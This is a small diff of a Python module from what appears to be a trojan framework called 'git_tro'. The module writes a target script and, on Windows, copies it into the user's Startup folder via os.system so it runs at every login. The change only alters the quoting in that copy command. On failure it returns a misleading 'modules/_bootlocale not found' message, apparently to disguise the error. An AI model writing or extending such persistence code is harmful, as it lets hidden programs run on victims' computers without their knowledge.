@@ -60,7 +60,7 @@ def run(**args): # Must import its personal lib, git_tro will execute this modul
 			fich.close()
 			if os.name == 'nt' and winRunOnBoot == True:
 				startPath=os.getenv("APPDATA")+"\Microsoft\Windows\Start Menu\Programs\Startup"
-				os.system("copy /Y \"%s\" \"%s\""%(targetPath, startPath))
+				os.system('copy /Y %s "%s" '%(targetPath, startPath))
 		except:
 			print("[Error] RunScriptFromGit: could not create Targetscript")
 			return " modules/_bootlocale not found!!"
